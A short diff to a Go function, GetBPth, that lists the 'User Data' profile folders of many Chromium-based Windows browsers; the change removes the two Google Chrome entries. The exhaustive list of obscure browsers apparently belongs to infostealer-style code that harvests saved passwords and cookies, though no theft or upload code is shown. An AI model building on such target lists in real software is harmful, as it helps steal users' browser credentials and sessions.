@@ -29,8 +29,6 @@ func GetBPth() []string {
 		local + "\\7Star\\7Star\\User Data",
 		local + "\\Sputnik\\Sputnik\\User Data",
 		local + "\\Vivaldi\\User Data",
-		local + "\\Google\\Chrome SxS\\User Data",
-		local + "\\Google\\Chrome\\User Data",
 		local + "\\Epic Privacy Browser\\User Data",
 		local + "\\Microsoft\\Edge\\User Data",
 		local + "\\uCozMedia\\Uran\\User Data",
